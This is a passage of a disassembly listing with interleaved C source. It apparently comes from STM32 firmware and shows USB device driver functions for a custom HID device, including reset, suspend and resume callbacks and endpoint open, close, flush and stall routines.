 800c924:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c928:	4618      	mov	r0, r3
 800c92a:	f7fe fd7d 	bl	800b428 <USBD_LL_SOF>
}
 800c92e:	bf00      	nop
 800c930:	3708      	adds	r7, #8
 800c932:	46bd      	mov	sp, r7
 800c934:	bd80      	pop	{r7, pc}

0800c936 <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c936:	b580      	push	{r7, lr}
 800c938:	b084      	sub	sp, #16
 800c93a:	af00      	add	r7, sp, #0
 800c93c:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800c93e:	2301      	movs	r3, #1
 800c940:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800c942:	687b      	ldr	r3, [r7, #4]
 800c944:	689b      	ldr	r3, [r3, #8]
 800c946:	2b02      	cmp	r3, #2
 800c948:	d001      	beq.n	800c94e <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800c94a:	f7f4 f985 	bl	8000c58 <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800c94e:	687b      	ldr	r3, [r7, #4]
 800c950:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c954:	7bfa      	ldrb	r2, [r7, #15]
 800c956:	4611      	mov	r1, r2
 800c958:	4618      	mov	r0, r3
 800c95a:	f7fe fd21 	bl	800b3a0 <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800c95e:	687b      	ldr	r3, [r7, #4]
 800c960:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c964:	4618      	mov	r0, r3
 800c966:	f7fe fcc9 	bl	800b2fc <USBD_LL_Reset>
}
 800c96a:	bf00      	nop
 800c96c:	3710      	adds	r7, #16
 800c96e:	46bd      	mov	sp, r7
 800c970:	bd80      	pop	{r7, pc}
	...

0800c974 <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c974:	b580      	push	{r7, lr}
 800c976:	b082      	sub	sp, #8
 800c978:	af00      	add	r7, sp, #0
 800c97a:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800c97c:	687b      	ldr	r3, [r7, #4]
 800c97e:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c982:	4618      	mov	r0, r3
 800c984:	f7fe fd1c 	bl	800b3c0 <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800c988:	687b      	ldr	r3, [r7, #4]
 800c98a:	699b      	ldr	r3, [r3, #24]
 800c98c:	2b00      	cmp	r3, #0
 800c98e:	d005      	beq.n	800c99c <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c990:	4b04      	ldr	r3, [pc, #16]	; (800c9a4 <HAL_PCD_SuspendCallback+0x30>)
 800c992:	691b      	ldr	r3, [r3, #16]
 800c994:	4a03      	ldr	r2, [pc, #12]	; (800c9a4 <HAL_PCD_SuspendCallback+0x30>)
 800c996:	f043 0306 	orr.w	r3, r3, #6
 800c99a:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800c99c:	bf00      	nop
 800c99e:	3708      	adds	r7, #8
 800c9a0:	46bd      	mov	sp, r7
 800c9a2:	bd80      	pop	{r7, pc}
 800c9a4:	e000ed00 	.word	0xe000ed00

0800c9a8 <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c9a8:	b580      	push	{r7, lr}
 800c9aa:	b082      	sub	sp, #8
 800c9ac:	af00      	add	r7, sp, #0
 800c9ae:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800c9b0:	687b      	ldr	r3, [r7, #4]
 800c9b2:	699b      	ldr	r3, [r3, #24]
 800c9b4:	2b00      	cmp	r3, #0
 800c9b6:	d007      	beq.n	800c9c8 <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800c9b8:	4b08      	ldr	r3, [pc, #32]	; (800c9dc <HAL_PCD_ResumeCallback+0x34>)
 800c9ba:	691b      	ldr	r3, [r3, #16]
 800c9bc:	4a07      	ldr	r2, [pc, #28]	; (800c9dc <HAL_PCD_ResumeCallback+0x34>)
 800c9be:	f023 0306 	bic.w	r3, r3, #6
 800c9c2:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800c9c4:	f000 faf0 	bl	800cfa8 <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800c9c8:	687b      	ldr	r3, [r7, #4]
 800c9ca:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800c9ce:	4618      	mov	r0, r3
 800c9d0:	f7fe fd12 	bl	800b3f8 <USBD_LL_Resume>
}
 800c9d4:	bf00      	nop
 800c9d6:	3708      	adds	r7, #8
 800c9d8:	46bd      	mov	sp, r7
 800c9da:	bd80      	pop	{r7, pc}
 800c9dc:	e000ed00 	.word	0xe000ed00

0800c9e0 <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800c9e0:	b580      	push	{r7, lr}
 800c9e2:	b082      	sub	sp, #8
 800c9e4:	af00      	add	r7, sp, #0
 800c9e6:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800c9e8:	f7f6 ff42 	bl	8003870 <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800c9ec:	4a26      	ldr	r2, [pc, #152]	; (800ca88 <USBD_LL_Init+0xa8>)
 800c9ee:	687b      	ldr	r3, [r7, #4]
 800c9f0:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800c9f4:	687b      	ldr	r3, [r7, #4]
 800c9f6:	4a24      	ldr	r2, [pc, #144]	; (800ca88 <USBD_LL_Init+0xa8>)
 800c9f8:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800c9fc:	4b22      	ldr	r3, [pc, #136]	; (800ca88 <USBD_LL_Init+0xa8>)
 800c9fe:	4a23      	ldr	r2, [pc, #140]	; (800ca8c <USBD_LL_Init+0xac>)
 800ca00:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800ca02:	4b21      	ldr	r3, [pc, #132]	; (800ca88 <USBD_LL_Init+0xa8>)
 800ca04:	2208      	movs	r2, #8
 800ca06:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800ca08:	4b1f      	ldr	r3, [pc, #124]	; (800ca88 <USBD_LL_Init+0xa8>)
 800ca0a:	2202      	movs	r2, #2
 800ca0c:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800ca0e:	4b1e      	ldr	r3, [pc, #120]	; (800ca88 <USBD_LL_Init+0xa8>)
 800ca10:	2202      	movs	r2, #2
 800ca12:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800ca14:	4b1c      	ldr	r3, [pc, #112]	; (800ca88 <USBD_LL_Init+0xa8>)
 800ca16:	2200      	movs	r2, #0
 800ca18:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800ca1a:	4b1b      	ldr	r3, [pc, #108]	; (800ca88 <USBD_LL_Init+0xa8>)
 800ca1c:	2200      	movs	r2, #0
 800ca1e:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800ca20:	4b19      	ldr	r3, [pc, #100]	; (800ca88 <USBD_LL_Init+0xa8>)
 800ca22:	2200      	movs	r2, #0
 800ca24:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800ca26:	4b18      	ldr	r3, [pc, #96]	; (800ca88 <USBD_LL_Init+0xa8>)
 800ca28:	2200      	movs	r2, #0
 800ca2a:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800ca2c:	4816      	ldr	r0, [pc, #88]	; (800ca88 <USBD_LL_Init+0xa8>)
 800ca2e:	f7f5 f8e7 	bl	8001c00 <HAL_PCD_Init>
 800ca32:	4603      	mov	r3, r0
 800ca34:	2b00      	cmp	r3, #0
 800ca36:	d001      	beq.n	800ca3c <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800ca38:	f7f4 f90e 	bl	8000c58 <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800ca3c:	687b      	ldr	r3, [r7, #4]
 800ca3e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca42:	2318      	movs	r3, #24
 800ca44:	2200      	movs	r2, #0
 800ca46:	2100      	movs	r1, #0
 800ca48:	f7f6 fe31 	bl	80036ae <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800ca4c:	687b      	ldr	r3, [r7, #4]
 800ca4e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca52:	2358      	movs	r3, #88	; 0x58
 800ca54:	2200      	movs	r2, #0
 800ca56:	2180      	movs	r1, #128	; 0x80
 800ca58:	f7f6 fe29 	bl	80036ae <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800ca5c:	687b      	ldr	r3, [r7, #4]
 800ca5e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca62:	2398      	movs	r3, #152	; 0x98
 800ca64:	2200      	movs	r2, #0
 800ca66:	2181      	movs	r1, #129	; 0x81
 800ca68:	f7f6 fe21 	bl	80036ae <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800ca6c:	687b      	ldr	r3, [r7, #4]
 800ca6e:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ca72:	23d8      	movs	r3, #216	; 0xd8
 800ca74:	2200      	movs	r2, #0
 800ca76:	2101      	movs	r1, #1
 800ca78:	f7f6 fe19 	bl	80036ae <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800ca7c:	2300      	movs	r3, #0
}
 800ca7e:	4618      	mov	r0, r3
 800ca80:	3708      	adds	r7, #8
 800ca82:	46bd      	mov	sp, r7
 800ca84:	bd80      	pop	{r7, pc}
 800ca86:	bf00      	nop
 800ca88:	20000b7c 	.word	0x20000b7c
 800ca8c:	40006800 	.word	0x40006800

0800ca90 <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800ca90:	b580      	push	{r7, lr}
 800ca92:	b084      	sub	sp, #16
 800ca94:	af00      	add	r7, sp, #0
 800ca96:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ca98:	2300      	movs	r3, #0
 800ca9a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ca9c:	2300      	movs	r3, #0
 800ca9e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800caa0:	687b      	ldr	r3, [r7, #4]
 800caa2:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800caa6:	4618      	mov	r0, r3
 800caa8:	f7f5 f9b0 	bl	8001e0c <HAL_PCD_Start>
 800caac:	4603      	mov	r3, r0
 800caae:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cab0:	7bbb      	ldrb	r3, [r7, #14]
 800cab2:	2b03      	cmp	r3, #3
 800cab4:	d816      	bhi.n	800cae4 <USBD_LL_Start+0x54>
 800cab6:	a201      	add	r2, pc, #4	; (adr r2, 800cabc <USBD_LL_Start+0x2c>)
 800cab8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cabc:	0800cacd 	.word	0x0800cacd
 800cac0:	0800cad3 	.word	0x0800cad3
 800cac4:	0800cad9 	.word	0x0800cad9
 800cac8:	0800cadf 	.word	0x0800cadf
    case HAL_OK :
      usb_status = USBD_OK;
 800cacc:	2300      	movs	r3, #0
 800cace:	73fb      	strb	r3, [r7, #15]
    break;
 800cad0:	e00b      	b.n	800caea <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cad2:	2303      	movs	r3, #3
 800cad4:	73fb      	strb	r3, [r7, #15]
    break;
 800cad6:	e008      	b.n	800caea <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cad8:	2301      	movs	r3, #1
 800cada:	73fb      	strb	r3, [r7, #15]
    break;
 800cadc:	e005      	b.n	800caea <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cade:	2303      	movs	r3, #3
 800cae0:	73fb      	strb	r3, [r7, #15]
    break;
 800cae2:	e002      	b.n	800caea <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800cae4:	2303      	movs	r3, #3
 800cae6:	73fb      	strb	r3, [r7, #15]
    break;
 800cae8:	bf00      	nop
  }
  return usb_status;
 800caea:	7bfb      	ldrb	r3, [r7, #15]
}
 800caec:	4618      	mov	r0, r3
 800caee:	3710      	adds	r7, #16
 800caf0:	46bd      	mov	sp, r7
 800caf2:	bd80      	pop	{r7, pc}

0800caf4 <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800caf4:	b580      	push	{r7, lr}
 800caf6:	b084      	sub	sp, #16
 800caf8:	af00      	add	r7, sp, #0
 800cafa:	6078      	str	r0, [r7, #4]
 800cafc:	4608      	mov	r0, r1
 800cafe:	4611      	mov	r1, r2
 800cb00:	461a      	mov	r2, r3
 800cb02:	4603      	mov	r3, r0
 800cb04:	70fb      	strb	r3, [r7, #3]
 800cb06:	460b      	mov	r3, r1
 800cb08:	70bb      	strb	r3, [r7, #2]
 800cb0a:	4613      	mov	r3, r2
 800cb0c:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb0e:	2300      	movs	r3, #0
 800cb10:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb12:	2300      	movs	r3, #0
 800cb14:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800cb16:	687b      	ldr	r3, [r7, #4]
 800cb18:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cb1c:	78bb      	ldrb	r3, [r7, #2]
 800cb1e:	883a      	ldrh	r2, [r7, #0]
 800cb20:	78f9      	ldrb	r1, [r7, #3]
 800cb22:	f7f5 fae1 	bl	80020e8 <HAL_PCD_EP_Open>
 800cb26:	4603      	mov	r3, r0
 800cb28:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb2a:	7bbb      	ldrb	r3, [r7, #14]
 800cb2c:	2b03      	cmp	r3, #3
 800cb2e:	d817      	bhi.n	800cb60 <USBD_LL_OpenEP+0x6c>
 800cb30:	a201      	add	r2, pc, #4	; (adr r2, 800cb38 <USBD_LL_OpenEP+0x44>)
 800cb32:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cb36:	bf00      	nop
 800cb38:	0800cb49 	.word	0x0800cb49
 800cb3c:	0800cb4f 	.word	0x0800cb4f
 800cb40:	0800cb55 	.word	0x0800cb55
 800cb44:	0800cb5b 	.word	0x0800cb5b
    case HAL_OK :
      usb_status = USBD_OK;
 800cb48:	2300      	movs	r3, #0
 800cb4a:	73fb      	strb	r3, [r7, #15]
    break;
 800cb4c:	e00b      	b.n	800cb66 <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cb4e:	2303      	movs	r3, #3
 800cb50:	73fb      	strb	r3, [r7, #15]
    break;
 800cb52:	e008      	b.n	800cb66 <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cb54:	2301      	movs	r3, #1
 800cb56:	73fb      	strb	r3, [r7, #15]
    break;
 800cb58:	e005      	b.n	800cb66 <USBD_LL_OpenEP+0x72>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cb5a:	2303      	movs	r3, #3
 800cb5c:	73fb      	strb	r3, [r7, #15]
    break;
 800cb5e:	e002      	b.n	800cb66 <USBD_LL_OpenEP+0x72>
    default :
      usb_status = USBD_FAIL;
 800cb60:	2303      	movs	r3, #3
 800cb62:	73fb      	strb	r3, [r7, #15]
    break;
 800cb64:	bf00      	nop
  }
  return usb_status;
 800cb66:	7bfb      	ldrb	r3, [r7, #15]
}
 800cb68:	4618      	mov	r0, r3
 800cb6a:	3710      	adds	r7, #16
 800cb6c:	46bd      	mov	sp, r7
 800cb6e:	bd80      	pop	{r7, pc}

0800cb70 <USBD_LL_CloseEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_CloseEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cb70:	b580      	push	{r7, lr}
 800cb72:	b084      	sub	sp, #16
 800cb74:	af00      	add	r7, sp, #0
 800cb76:	6078      	str	r0, [r7, #4]
 800cb78:	460b      	mov	r3, r1
 800cb7a:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cb7c:	2300      	movs	r3, #0
 800cb7e:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cb80:	2300      	movs	r3, #0
 800cb82:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Close(pdev->pData, ep_addr);
 800cb84:	687b      	ldr	r3, [r7, #4]
 800cb86:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cb8a:	78fa      	ldrb	r2, [r7, #3]
 800cb8c:	4611      	mov	r1, r2
 800cb8e:	4618      	mov	r0, r3
 800cb90:	f7f5 fb07 	bl	80021a2 <HAL_PCD_EP_Close>
 800cb94:	4603      	mov	r3, r0
 800cb96:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cb98:	7bbb      	ldrb	r3, [r7, #14]
 800cb9a:	2b03      	cmp	r3, #3
 800cb9c:	d816      	bhi.n	800cbcc <USBD_LL_CloseEP+0x5c>
 800cb9e:	a201      	add	r2, pc, #4	; (adr r2, 800cba4 <USBD_LL_CloseEP+0x34>)
 800cba0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cba4:	0800cbb5 	.word	0x0800cbb5
 800cba8:	0800cbbb 	.word	0x0800cbbb
 800cbac:	0800cbc1 	.word	0x0800cbc1
 800cbb0:	0800cbc7 	.word	0x0800cbc7
    case HAL_OK :
      usb_status = USBD_OK;
 800cbb4:	2300      	movs	r3, #0
 800cbb6:	73fb      	strb	r3, [r7, #15]
    break;
 800cbb8:	e00b      	b.n	800cbd2 <USBD_LL_CloseEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cbba:	2303      	movs	r3, #3
 800cbbc:	73fb      	strb	r3, [r7, #15]
    break;
 800cbbe:	e008      	b.n	800cbd2 <USBD_LL_CloseEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cbc0:	2301      	movs	r3, #1
 800cbc2:	73fb      	strb	r3, [r7, #15]
    break;
 800cbc4:	e005      	b.n	800cbd2 <USBD_LL_CloseEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cbc6:	2303      	movs	r3, #3
 800cbc8:	73fb      	strb	r3, [r7, #15]
    break;
 800cbca:	e002      	b.n	800cbd2 <USBD_LL_CloseEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cbcc:	2303      	movs	r3, #3
 800cbce:	73fb      	strb	r3, [r7, #15]
    break;
 800cbd0:	bf00      	nop
  }
  return usb_status;
 800cbd2:	7bfb      	ldrb	r3, [r7, #15]
}
 800cbd4:	4618      	mov	r0, r3
 800cbd6:	3710      	adds	r7, #16
 800cbd8:	46bd      	mov	sp, r7
 800cbda:	bd80      	pop	{r7, pc}

0800cbdc <USBD_LL_FlushEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_FlushEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cbdc:	b580      	push	{r7, lr}
 800cbde:	b084      	sub	sp, #16
 800cbe0:	af00      	add	r7, sp, #0
 800cbe2:	6078      	str	r0, [r7, #4]
 800cbe4:	460b      	mov	r3, r1
 800cbe6:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cbe8:	2300      	movs	r3, #0
 800cbea:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cbec:	2300      	movs	r3, #0
 800cbee:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Flush(pdev->pData, ep_addr);
 800cbf0:	687b      	ldr	r3, [r7, #4]
 800cbf2:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cbf6:	78fa      	ldrb	r2, [r7, #3]
 800cbf8:	4611      	mov	r1, r2
 800cbfa:	4618      	mov	r0, r3
 800cbfc:	f7f5 fc66 	bl	80024cc <HAL_PCD_EP_Flush>
 800cc00:	4603      	mov	r3, r0
 800cc02:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc04:	7bbb      	ldrb	r3, [r7, #14]
 800cc06:	2b03      	cmp	r3, #3
 800cc08:	d816      	bhi.n	800cc38 <USBD_LL_FlushEP+0x5c>
 800cc0a:	a201      	add	r2, pc, #4	; (adr r2, 800cc10 <USBD_LL_FlushEP+0x34>)
 800cc0c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc10:	0800cc21 	.word	0x0800cc21
 800cc14:	0800cc27 	.word	0x0800cc27
 800cc18:	0800cc2d 	.word	0x0800cc2d
 800cc1c:	0800cc33 	.word	0x0800cc33
    case HAL_OK :
      usb_status = USBD_OK;
 800cc20:	2300      	movs	r3, #0
 800cc22:	73fb      	strb	r3, [r7, #15]
    break;
 800cc24:	e00b      	b.n	800cc3e <USBD_LL_FlushEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc26:	2303      	movs	r3, #3
 800cc28:	73fb      	strb	r3, [r7, #15]
    break;
 800cc2a:	e008      	b.n	800cc3e <USBD_LL_FlushEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc2c:	2301      	movs	r3, #1
 800cc2e:	73fb      	strb	r3, [r7, #15]
    break;
 800cc30:	e005      	b.n	800cc3e <USBD_LL_FlushEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc32:	2303      	movs	r3, #3
 800cc34:	73fb      	strb	r3, [r7, #15]
    break;
 800cc36:	e002      	b.n	800cc3e <USBD_LL_FlushEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cc38:	2303      	movs	r3, #3
 800cc3a:	73fb      	strb	r3, [r7, #15]
    break;
 800cc3c:	bf00      	nop
  }
  return usb_status;
 800cc3e:	7bfb      	ldrb	r3, [r7, #15]
}
 800cc40:	4618      	mov	r0, r3
 800cc42:	3710      	adds	r7, #16
 800cc44:	46bd      	mov	sp, r7
 800cc46:	bd80      	pop	{r7, pc}

0800cc48 <USBD_LL_StallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_StallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cc48:	b580      	push	{r7, lr}
 800cc4a:	b084      	sub	sp, #16
 800cc4c:	af00      	add	r7, sp, #0
 800cc4e:	6078      	str	r0, [r7, #4]
 800cc50:	460b      	mov	r3, r1
 800cc52:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc54:	2300      	movs	r3, #0
 800cc56:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc58:	2300      	movs	r3, #0
 800cc5a:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_SetStall(pdev->pData, ep_addr);
 800cc5c:	687b      	ldr	r3, [r7, #4]
 800cc5e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc62:	78fa      	ldrb	r2, [r7, #3]
 800cc64:	4611      	mov	r1, r2
 800cc66:	4618      	mov	r0, r3
 800cc68:	f7f5 fb7c 	bl	8002364 <HAL_PCD_EP_SetStall>
 800cc6c:	4603      	mov	r3, r0
 800cc6e:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc70:	7bbb      	ldrb	r3, [r7, #14]
 800cc72:	2b03      	cmp	r3, #3
 800cc74:	d816      	bhi.n	800cca4 <USBD_LL_StallEP+0x5c>
 800cc76:	a201      	add	r2, pc, #4	; (adr r2, 800cc7c <USBD_LL_StallEP+0x34>)
 800cc78:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cc7c:	0800cc8d 	.word	0x0800cc8d
 800cc80:	0800cc93 	.word	0x0800cc93
 800cc84:	0800cc99 	.word	0x0800cc99
 800cc88:	0800cc9f 	.word	0x0800cc9f
    case HAL_OK :
      usb_status = USBD_OK;
 800cc8c:	2300      	movs	r3, #0
 800cc8e:	73fb      	strb	r3, [r7, #15]
    break;
 800cc90:	e00b      	b.n	800ccaa <USBD_LL_StallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cc92:	2303      	movs	r3, #3
 800cc94:	73fb      	strb	r3, [r7, #15]
    break;
 800cc96:	e008      	b.n	800ccaa <USBD_LL_StallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cc98:	2301      	movs	r3, #1
 800cc9a:	73fb      	strb	r3, [r7, #15]
    break;
 800cc9c:	e005      	b.n	800ccaa <USBD_LL_StallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cc9e:	2303      	movs	r3, #3
 800cca0:	73fb      	strb	r3, [r7, #15]
    break;
 800cca2:	e002      	b.n	800ccaa <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cca4:	2303      	movs	r3, #3
 800cca6:	73fb      	strb	r3, [r7, #15]
    break;
 800cca8:	bf00      	nop
  }
  return usb_status;
 800ccaa:	7bfb      	ldrb	r3, [r7, #15]
}
 800ccac:	4618      	mov	r0, r3
 800ccae:	3710      	adds	r7, #16
 800ccb0:	46bd      	mov	sp, r7
 800ccb2:	bd80      	pop	{r7, pc}

0800ccb4 <USBD_LL_ClearStallEP>:
